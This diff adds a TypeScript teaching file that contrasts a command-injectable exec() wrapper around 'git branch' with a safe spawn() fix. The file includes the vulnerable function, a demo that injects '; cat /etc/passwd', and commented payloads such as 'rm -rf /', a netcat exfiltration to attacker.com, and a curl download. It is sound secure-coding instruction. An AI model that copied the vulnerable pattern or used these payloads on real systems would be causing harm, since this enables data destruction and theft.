@@ -1,0 +1,84 @@
+/**
+ * UNSAFE Command Execution Example - DO NOT USE IN PRODUCTION
+ *
+ * This file demonstrates VULNERABLE code patterns that should NEVER be used.
+ * It exists only for educational purposes to show what NOT to do.
+ *
+ * The cli-wrapper-server uses SAFE spawn() with shell: false instead.
+ */
+
+import { exec } from 'child_process';
+
+/**
+ * UNSAFE: exec() with string interpolation
+ *
+ * User input is directly interpolated into the command string.
+ * The shell interprets special characters, allowing command injection.
+ */
+function unsafeExecute(userInput: string): Promise<string> {
+  return new Promise((resolve, reject) => {
+    // BAD: User input is interpolated into shell command
+    exec(`git branch --list ${userInput}`, (error, stdout, stderr) => {
+      if (error) {
+        reject(new Error(stderr));
+      } else {
+        resolve(stdout);
+      }
+    });
+  });
+}
+
+// Example of exploitation
+async function demonstrateVulnerability() {
+  // Normal use looks fine
+  console.log('Normal use:');
+  const normalResult = await unsafeExecute('main');
+  console.log(normalResult);
+
+  // But an attacker can inject commands!
+  console.log('\nAttack demonstration:');
+
+  // This input will:
+  // 1. Finish the git command (with ; )
+  // 2. Execute a malicious command (cat /etc/passwd)
+  const maliciousInput = '; cat /etc/passwd';
+
+  // The resulting command is:
+  // git branch --list ; cat /etc/passwd
+  // This executes BOTH commands!
+
+  try {
+    const attackResult = await unsafeExecute(maliciousInput);
+    console.log('Attack succeeded! Output:', attackResult);
+    // Would print the contents of /etc/passwd on a real system
+  } catch (error) {
+    console.log('Attack result:', error);
+  }
+
+  // Other injection examples:
+  // '; rm -rf /'           - Delete everything (DESTRUCTIVE!)
+  // '| nc attacker.com 80' - Send data to attacker
+  // '$(curl http://evil)'  - Download and potentially execute malware
+  // '`whoami`'             - Reveal system user
+}
+
+/**
+ * THE FIX: Use spawn() with shell: false
+ *
+ * import { spawn } from 'child_process';
+ *
+ * function safeExecute(userInput: string): Promise<string> {
+ *   return new Promise((resolve, reject) => {
+ *     const child = spawn('git', ['branch', '--list', userInput], {
+ *       shell: false,  // CRITICAL
+ *     });
+ *     // ... handle stdout/stderr ...
+ *   });
+ * }
+ *
+ * With spawn() and shell: false, the malicious input "; cat /etc/passwd"
+ * is treated as a literal branch name, not as shell commands.
+ */
+
+// WARNING: Do not actually run this code!
+// demonstrateVulnerability();
